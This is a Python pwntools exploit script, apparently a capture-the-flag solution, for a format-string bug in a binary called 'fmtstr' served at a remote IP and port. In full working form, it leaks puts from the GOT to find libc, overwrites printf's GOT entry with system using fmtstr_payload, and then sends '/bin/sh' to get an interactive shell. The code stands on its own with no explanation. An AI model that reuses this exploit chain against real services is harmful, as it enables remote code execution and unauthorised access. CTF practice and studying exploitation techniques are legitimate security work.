from pwn import *
import sys
import os

host = '143.198.127.103'
port = 42002

# ==================================================================
elf = ELF('fmtstr')
context.update(os='linux', arch='amd64', binary=elf)

def exec_fmt(payload):
    p = elf.process()
    p.recvuntil(b':clown:)\n')
    p.sendline(b'JUNK')
    p.recvuntil(b'input:\n')
    p.sendline(payload)
    ret = p.recvline().strip()
    p.close()
    return ret

# autofmt = FmtStr(exec_fmt)
# fmt_offset = autofmt.offset
fmt_offset = 6
log.info(f'Format string offset: {fmt_offset}')

# ==================================================================
if args.LOCAL:
    p = elf.process()
    libc = ELF('libc-2.31.so')
else:
    p = remote(host, port)
    libc = ELF('libc-2.31.so')
p.recvuntil(b':clown:)\n')
p.sendline(b'JUNK')

# ==================================================================
p.recvuntil(b'input:\n')
func = 'puts'
payload = b'%7$s '
payload += b'X' * (8 - len(payload))
payload += p64(elf.got[func])
p.sendline(payload)
got_leak = u64(p.recvuntil(b' X')[:-2].ljust(8, b'\x00'))
log.info(f'Leaked {func}: {hex(got_leak)}')
libc.address = got_leak - libc.symbols[func]

# ==================================================================
p.recvuntil(b'input:\n')
addr = elf.got['printf']
value = libc.symbols['system']
log.info(f'Writing {hex(value)} at address {hex(addr)}')
payload = fmtstr_payload(fmt_offset, {addr: value}, write_size='byte')
p.sendline(payload)

# ==================================================================
p.recvuntil(b'input:\n')
p.sendline(b'/bin/sh')
p.interactive()
p.close()

